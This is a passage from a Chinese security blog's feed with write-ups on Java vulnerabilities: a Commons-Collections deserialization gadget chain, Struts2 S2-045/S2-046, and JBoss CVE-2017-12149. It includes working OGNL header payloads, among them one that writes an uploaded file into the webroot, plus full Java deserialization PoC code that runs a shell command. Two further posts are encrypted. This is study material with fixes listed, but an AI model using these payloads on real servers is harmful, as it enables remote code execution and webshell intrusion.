class="comment">//为私有属性_bytecodes赋值，即恶意类的字节码</span></span><br><span class="line">        Field tf = clazz.getDeclaredField(<span class="string">"_bytecodes"</span>);</span><br><span class="line">        tf.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        tf.set(tmp,<span class="keyword">new</span> <span class="keyword">byte</span>[][]&#123;PayCode&#125;);</span><br><span class="line">        <span class="comment">//为私有属性_name赋值，内容任意</span></span><br><span class="line">        Field name = clazz.getDeclaredField(<span class="string">"_name"</span>);</span><br><span class="line">        name.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        name.set(tmp,<span class="string">"gqy"</span>);</span><br><span class="line">        <span class="comment">//2.封装chained和lazymap</span></span><br><span class="line">        Transformer[] trans = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="comment">//ConstantTransformer会将参数原样返回</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                <span class="comment">//传入我们的TemplatesImpl实例，会在构造函数中调用templates.newTransformer()</span></span><br><span class="line">                <span class="keyword">new</span> InstantiateTransformer(</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;Templates.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;tmp&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(trans);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        <span class="comment">//3.将proxy代理放进外层的AnnotationInvocationHandler，从而membervalues.entryset触发动态代理（与commonscollection1相同）</span></span><br><span class="line">        String clazzName = <span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>;</span><br><span class="line">        <span class="comment">//获取AnnotationInvocationHandler类的构造方法数组</span></span><br><span class="line">        Constructor&lt;?&gt; ctor = Class.forName(clazzName).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//代理对象的调用处理程序，我们将要代理的真实对象传入代理对象的调用处理的构造函数中，最终代理对象的调用处理程序会调用真实对象的方法</span></span><br><span class="line">        InvocationHandler annotationInvocationHandler = (InvocationHandler)ctor.newInstance(Override.class, lazyMap);</span><br><span class="line">        <span class="comment">//Proxy.newProxyInstance的三个参数</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">          通过Proxy类的newProxyInstance方法创建代理对象，我们来看下方法中的参数</span></span><br><span class="line"><span class="comment">          第一个参数：people.getClass().getClassLoader()，使用handler对象的classloader对象来加载我们的代理对象</span></span><br><span class="line"><span class="comment">          第二个参数：people.getClass().getInterfaces()，这里为代理类提供的接口是真实对象实现的接口，这样代理对象就能像真实对象一样调用接口中的所有方法</span></span><br><span class="line"><span class="comment">          第三个参数：handler，我们将代理对象关联到上面的InvocationHandler对象上</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        InvocationHandler poc = (InvocationHandler)ctor.newInstance(Override.class, Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(), lazyMap.getClass().getInterfaces(), annotationInvocationHandler));</span><br><span class="line">        <span class="comment">//4.序列化</span></span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"poc.txt"</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        out.writeObject(poc);</span><br><span class="line">        out.close();</span><br><span class="line">        <span class="comment">//5.反序列化obj对象</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"poc.txt"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><p>后面还有几条，未完待续</p><p>但是通过前面几条可以看到利用的知识主要是动态代理，javassist动态编程，反射等，加上寻找一些类的组合利用。</p><h4><span id="参考链接">参考链接</span></h4><p> <a href="https://www.freebuf.com/articles/web/214096.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/214096.html</a> </p><p> <a href="https://www.anquanke.com/post/id/200637" target="_blank" rel="noopener">https://www.anquanke.com/post/id/200637</a></p>]]></content>
    
    <summary type="html">
    
      &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;
    
    </summary>
    
    
    
      <category term="java" scheme="https://glotozz.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Java漏洞学习-S2-046</title>
    <link href="https://glotozz.github.io/2020/04/14/Java%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-S2-046/"/>
    <id>https://glotozz.github.io/2020/04/14/Java%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-S2-046/</id>
    <published>2020-04-14T01:21:22.000Z</published>
    <updated>2020-04-14T06:16:50.030Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"><a id="more"></a><p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p><!-- toc --><ul><li><a href="#漏洞原因">漏洞原因</a></li><li><a href="#环境搭建">环境搭建</a></li><li><a href="#漏洞复现">漏洞复现</a></li><li><a href="#漏洞分析">漏洞分析</a></li><li><a href="#漏洞修复">漏洞修复</a></li></ul><!-- tocstop --><hr><p><code>st-046</code>建立在<code>st-045</code>的基础之上，如果之前对于<code>st-045</code>的修复方式仅针对<code>Content-Type</code>做策略防护的话，还需要对<code>Content-Disposition</code>也加一下策略。当然最好的方式还是升级到最新版。 </p><h4><span id="漏洞原因">漏洞原因</span></h4><p>有两个</p><p>①<code>Content-Length</code>的长度值超长</p><p>这个漏洞需要在<code>strust.xml</code>中加入<code>&lt;constant name=&quot;struts.multipart.parser&quot; value=&quot;jakarta-stream&quot; /&gt;</code>才能触发。<br>触发漏洞的代码在 <code>JakartaStreamMultiPartRequest类</code>中，<code>processUpload</code>函数处理了<code>content-length</code>长度超长的异常，导致问题触发。</p><p>②<code>Content-Disposition</code>的<code>filename</code>存在空字节</p><h4><span id="环境搭建">环境搭建</span></h4><p>和st-045相同</p><p>影响版本: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</p><p>maven搭建</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;!-- struts2依赖包 --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.struts&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;struts2-core&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.3.30&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br><span class="line">&lt;&#x2F;dependencies&gt;</span><br></pre></td></tr></table></figure><h4><span id="漏洞复现">漏洞复现</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name&#x3D;&quot;upload&quot;; filename&#x3D;&quot;%&#123;#context[&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;].addHeader(&#39;X-Test&#39;,233*233)&#125;\0b&quot;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/14/a4FIYKJLpfvPrCQ.png" alt="Snipaste_2020-04-14_09-48-04.png"></p><h4><span id="漏洞分析">漏洞分析</span></h4><p>可以从tomcat的报错信息查看调用栈</p><p><img src="https://i.loli.net/2020/04/14/4S8JyDWK9bwx2rq.png" alt="Snipaste_2020-04-14_09-50-59.png"></p><p>前面的调用栈比较清楚，看最后的<code>checkName()</code></p><p><code>/org/apache/commons/fileupload/util/Streams.class</code></p><p><img src="https://i.loli.net/2020/04/14/fANdXWJ2zpZ4Q8G.png" alt="Snipaste_2020-04-14_10-01-57.png"></p><p>在这里由于我们传入了<code>\0</code>，进入第一个if分支，导致抛出异常，继续跟进</p><p><img src="https://i.loli.net/2020/04/14/mjZiuYxqUThowP7.png" alt="Snipaste_2020-04-14_10-51-38.png"></p><p>之后会进入<code>st-045</code>中分析过的<code>buildErrorMessage()</code>，具体不再赘述。</p><h4><span id="漏洞修复">漏洞修复</span></h4><ul><li>严格过滤<code>Content-Type</code> 、<code>filename</code>里的内容，严禁ognl表达式相关字段。</li><li>如果您使用基于Jakarta插件，请升级到Apache Struts 2.3.32或2.5.10.1版本。</li></ul><hr>]]></content>
    
    <summary type="html">
    
      &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;
    
    </summary>
    
    
    
      <category term="java" scheme="https://glotozz.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Java漏洞学习-S2-045</title>
    <link href="https://glotozz.github.io/2020/04/13/Java%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-S2-045/"/>
    <id>https://glotozz.github.io/2020/04/13/Java%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0-S2-045/</id>
    <published>2020-04-13T08:13:17.000Z</published>
    <updated>2020-04-13T14:56:40.055Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"><a id="more"></a><p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p><!-- toc --><ul><li><a href="#环境搭建">环境搭建</a></li><li><a href="#漏洞复现">漏洞复现</a></li><li><a href="#原理分析">原理分析</a></li><li><a href="#漏洞修复">漏洞修复</a></li><li><a href="#参考链接">参考链接</a></li></ul><!-- tocstop --><hr><p>面试的时候问到了<code>st2-045</code>漏洞以及绕过修复后出现的<code>st2-046</code>，分析一下</p><p>Struts2默认解析上传文件的<code>Content-Type</code>头，存在问题。在解析错误的情况下，会执行错误信息中的OGNL代码，当<code>Content-Type</code>注入Payload后就可以通过OGNL执行命令。</p><h4><span id="环境搭建">环境搭建</span></h4><p>影响版本: Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</p><p>maven搭建</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;!-- struts2依赖包 --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.struts&lt;&#x2F;groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;struts2-core&lt;&#x2F;artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.3.30&lt;&#x2F;version&gt;</span><br><span class="line">        &lt;&#x2F;dependency&gt;</span><br><span class="line">&lt;&#x2F;dependencies&gt;</span><br></pre></td></tr></table></figure><h4><span id="漏洞复现">漏洞复现</span></h4><p>验证</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: %&#123;#context[&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;].addHeader(&#39;vulhub&#39;,233*233)&#125;.multipart&#x2F;form-data</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/13/pQCkG5xfyKXtEYR.png" alt="Snipaste_2020-04-13_19-15-26.png"></p><p>getshell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_multipart&#x2F;form-data%&#123;(#o&#x3D;@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess&#x3D;#o):((#c&#x3D;#context[&#39;com.opensymphony.xwork2.ActionContext.container&#39;]).(#g&#x3D;#c.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#g.getExcludedPackageNames().clear()).(#g.getExcludedClasses().clear()).(#context.setMemberAccess(#o)))).(#req&#x3D;@org.apache.struts2.ServletActionContext@getRequest()).(#f&#x3D;new java.io.File(#req.getRealPath(&#39;&#x2F;&#39;),#req.getParameter(&#39;f&#39;))).(@org.apache.commons.io.IOUtils@copy(#req.getInputStream(),new java.io.FileOutputStream(#f)))&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/13/vDtFscX9OeiNzB5.png" alt="Snipaste_2020-04-13_19-07-59.png"></p><p>访问<code>x.jsp</code></p><p><img src="https://i.loli.net/2020/04/13/X4nLAxDZQqHVhtO.png" alt="Snipaste_2020-04-13_19-14-16.png"></p><h4><span id="原理分析">原理分析</span></h4><blockquote><p><code>v2.3.32</code>：<a href="https://github.com/apache/struts/commit/352306493971e7d5a756d61780d57a76eb1f519a" target="_blank" rel="noopener">https://github.com/apache/struts/commit/352306493971e7d5a756d61780d57a76eb1f519a</a> </p></blockquote><p>根据diff版本更新前后分析</p><p><img src="https://i.loli.net/2020/04/13/AHMP6yKmO2NcFER.png" alt="Snipaste_2020-04-13_20-50-47.png"></p><p>我的maven包是<code>2.3.30</code>，大同小异</p><p><code>org/apache/struts/struts2-core/2.3.30/struts2-core-2.3.30.jar!/org/apache/struts2/dispatcher/multipart/JakartaMultiPartRequest.class</code></p><p><img src="https://i.loli.net/2020/04/13/qRAlcDY2InOymCo.png" alt="Snipaste_2020-04-13_21-04-32.png"></p><p>根据方法名可以看出是生成错误消息，跟进<code>LocalizedTextUtil</code>类的<code>findText()</code></p><p><img src="https://i.loli.net/2020/04/13/OsZTzyvMUC5pKYt.png" alt="Snipaste_2020-04-13_21-20-30.png"></p><p>可以看到，对<code>findText()</code>方法进行了重载，先调用上面的<code>findText()</code>，再调用下面的<code>findText()</code></p><p>具体跟进<code>findText()</code>中的<code>getDefaultMessage()</code></p><p><img src="https://i.loli.net/2020/04/13/pnQXmoRbJrk7YaC.png" alt="Snipaste_2020-04-13_21-27-44.png"></p><p>跟进<code>TextParseUtil.translateVariables()</code></p><p><img src="https://i.loli.net/2020/04/13/GviwY3RQLk5pIWT.png" alt="Snipaste_2020-04-13_21-41-42.png"></p><p>这里存在递归调用，跟进</p><p><img src="https://i.loli.net/2020/04/13/RSkVP5z4ZOJu1s2.png" alt="Snipaste_2020-04-13_21-58-20.png"></p><p>跟进<code>parse.evaluate()</code></p><p><img src="https://i.loli.net/2020/04/13/JDqyj6ZO2dfFtPb.png" alt="Snipaste_2020-04-13_22-10-55.png"></p><p>跟进实现这个接口的类</p><p><img src="https://i.loli.net/2020/04/13/J4WdO9IRjsNkBD7.png" alt="Snipaste_2020-04-13_22-12-02.png"></p><p>执行了ognl表达式</p><p>最后再回去分析如何跳到<code>buildErrorMessage()</code></p><p>在 struts2 的框架当中，内置了许多的拦截器，主要用于对框架的功能扩展，此次漏洞的<code>FileUploadInterceptor</code> 就是对框架文件上传的功能扩展，这里就是处理无效的<code>Content-Type</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.apache.commons.fileupload.FileUploadBase$InvalidContentTypeException: the request doesn&#39;t contain a multipart&#x2F;form-data or multipart&#x2F;mixed stream, content type header is %&#123;#context[&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;].addHeader(&#39;vulhub&#39;,233*233)&#125;.multipart&#x2F;form-data</span><br></pre></td></tr></table></figure><p> <img src="https://i.loli.net/2020/04/13/K4QreOhH3FJPGTL.png" alt="Snipaste_2020-04-13_22-29-46.png"></p><h4><span id="漏洞修复">漏洞修复</span></h4><ul><li>升级至Struts2安全版本</li><li>使用Servlet过滤器验证<code>Content-Type</code>过滤不匹配的请求<code>multipart/form-data</code></li></ul><h4><span id="参考链接">参考链接</span></h4><p> <a href="http://www.polaris-lab.com/index.php/archives/45/" target="_blank" rel="noopener">http://www.polaris-lab.com/index.php/archives/45/</a> </p><p> <a href="https://paper.seebug.org/247/#0x01" target="_blank" rel="noopener">https://paper.seebug.org/247/#0x01</a></p>]]></content>
    
    <summary type="html">
    
      &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;
    
    </summary>
    
    
    
      <category term="java" scheme="https://glotozz.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>Java反序列化漏洞-CVE-2017-12149-JBoss</title>
    <link href="https://glotozz.github.io/2020/04/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2017-12149-JBoss/"/>
    <id>https://glotozz.github.io/2020/04/13/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-CVE-2017-12149-JBoss/</id>
    <published>2020-04-13T06:20:10.000Z</published>
    <updated>2020-04-14T01:19:56.382Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"><a id="more"></a><p> &nbsp;  &nbsp; &nbsp;&nbsp;&nbsp;<strong>简陋的目录</strong></p><!-- toc --><ul><li><a href="#环境搭建">环境搭建</a></li><li><a href="#漏洞分析">漏洞分析</a></li><li><a href="#漏洞修复">漏洞修复</a></li><li><a href="#总结">总结</a></li></ul><!-- tocstop --><hr><p>之前分析过 ysoserial中<code>CommonsCollections5</code>这条链，而互联网爆出JBOSS反序列化命令执行漏洞(CVE-2017-12149)，远程攻击者利用漏洞可在未经任何身份验证的服务器主机上执行任意代码，可以利用那条链。</p><h4><span id="环境搭建">环境搭建</span></h4><p>漏洞影响5.x和6.x版本的JBOSSAS。 </p><p>这里搭建的环境为<code>JBoss AS 6.1.0.Final</code></p><h4><span id="漏洞分析">漏洞分析</span></h4><p><code>server/all/deploy/httpha-invoker.sar/invoker.war/WEB-INF/classes/org/jboss/invocation/http/servlet/ReadOnlyAccessFilter.class</code></p><p><code>doFilter()</code>方法</p><p><img src="https://i.loli.net/2020/04/13/5pcVu8M7GyXJeCm.png" alt="Snipaste_2020-04-13_15-30-05.png"></p><p>直接从http中获取数据，并直接调用<code>readObject()</code>进行反序列化</p><p>用之前写过的POC打一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.company;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InstantiationException, InvocationTargetException, IOException, NoSuchFieldException </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="comment">//传入Runtime类</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，然后getMethod方法再反射调用getRuntime方法，返回Runtime.getRuntime()方法</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class, Class[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，然后反射执行Runtime.getRuntime()方法，返回Runtime实例化对象</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">"curl localhost:7999"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);</span><br><span class="line">        TiedMapEntry entry = <span class="keyword">new</span> TiedMapEntry(lazyMap, <span class="string">"foo"</span>);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException poc = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// val是私有变量，所以利用下面方法进行赋值</span></span><br><span class="line">        Field valfield = poc.getClass().getDeclaredField(<span class="string">"val"</span>);</span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(poc, entry);</span><br><span class="line"></span><br><span class="line">        File f = <span class="keyword">new</span> File(<span class="string">"poc.txt"</span>);</span><br><span class="line">        ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(f));</span><br><span class="line">        out.writeObject(poc);</span><br><span class="line">        out.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//从文件中反序列化obj对象</span></span><br><span class="line">        FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"poc.txt"</span>);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">        <span class="comment">//恢复对象</span></span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/13/8C7dDEUwzu4NXLQ.png" alt="Snipaste_2020-04-13_15-50-13.png"></p><h4><span id="漏洞修复">漏洞修复</span></h4><ul><li><p>升级新版本。</p></li><li><p>删除<code>http-invoker.sar</code> 组件。</p></li><li><p>添加如下代码至 <code>http-invoker.sar</code> 下 <code>web.xml</code>的<code>security-constraint</code> 标签中：</p><p><code>&lt;url-pattern&gt;/*&lt;/url-pattern&gt;</code>用于对 <code>http invoker</code> 组件进行访问控制。</p></li></ul><h4><span id="总结">总结</span></h4><p>对于Jboss，Tomcat，Struts2，Weblogic等等， 这些应用都是为了完成一个Java的Web服务，那么，在拥有Java环境的情况下，我们需要一个能够监听Web服务并且调度相关逻辑的服务器。而通常这些架构都设置了过滤器，会对请求进行过滤处理，因此如果漏洞出现在Filter层面，触发的条件也变得简单，危害较大。</p>]]></content>
    
    <summary type="html">
    
      &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot; /&gt;
    
    </summary>
    
    
    
      <category term="java" scheme="https://glotozz.github.io/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>waf-bypass学习</title>
    <link href="https://glotozz.github.io/2020/04/12/waf-bypass%E5%AD%A6%E4%B9%A0/"/>
    <id>https://glotozz.github.io/2020/04/12/waf-bypass%E5%AD%A6%E4%B9%A0/</id>
    <published>2020-04-12T06:19:31.000Z</published>
    <updated>2020-04-13T06:07:35.169Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">password is required to continue reading.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="8251ec019334c13e2f7cdd2e80024f0bb51b6410977b8847e6b8ed3c8fc2a814"></script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted.
    
    </summary>
    
    
    
      <category term="渗透" scheme="https://glotozz.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>PHPMailer历史漏洞分析</title>
    <link href="https://glotozz.github.io/2020/04/12/PHPMailer%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>https://glotozz.github.io/2020/04/12/PHPMailer%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-04-12T03:38:10.000Z</published>
    <updated>2020-04-12T06:08:00.300Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">password is required to continue reading.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="3197dc3bee61435d97ccde240566c045727519996a52a2eaa64d327ae8f709a9">55d96a2fa27dbc874898e0362dde5b24f28d899b877049cdd7d22059470309af5eecf3920822b7658efe36756680303f8e9073538126be0c55251b319e70271461228b7d366eac090f391d6520cd0b22bf49d13408f159aad4390bac20c168abf4c12cfb29c40217c8d08a9cda2e6dc2b58317391afa16f1972636c08233ffd48a4a3dbe0a0c282eb441523bf352ef2010a129c280dfca0931076587ef71c84e829ccc5f269f333fb640e81a48843465abf37b66bc68dfdd32a9fa59098ec89e160f3a1186c4a1e68b46093542da9cc15703f20a534579a4c3ecc9696fc6f55bfb97a66ff39e6f7db5a43053c10850067629051be84516fcea04881a856eb7c79ecf4fa0c371b825c7844c4f182c441fa9bc2f0230a022c4cf5770f55e04726c355dcfead92a34609d4e203573ccf8bf8184aa0eca5af223795090b614c66665ae901f611929b35297920735b0fe6cb3e6532142823a9a56dd105b3bd2014d490d0343d70a0ea7fab9bc0ff7fe1ebf1dec9156e1ff1bc847f2ec9f87ebd9eb15ba9dcebc96f07870e57b9c31335a0bcb3a3b3a778f72a0d7aba5556c6e138b72fd112170b17fc2ffb1822475f00a9afb1f06b2ad68832bbd5331dd1ce0c9f0e38722fade4986089d882b5c927a1e08b49b43323188384cb03198043aaa4491d20d7b260fd5496720a34867f295cea6c9319507dd7888a2ddda90286577d1822525e7a37d7fa1ab6aaa9da6806aa87aec2c39fe8a9aa6e3324836c3e46b2e3b57d745fa702b9ebe1af34411c2e9e4891094e4c72d7e8ae310b18c1c2c214c84316587f01d5534c4260fcaeec685c9ae503face2514870e08bdeae2c2b72b7cc37e14ad698f44f4526b3696c8e7c89872e9c2eee6c54ec3fe054b608f5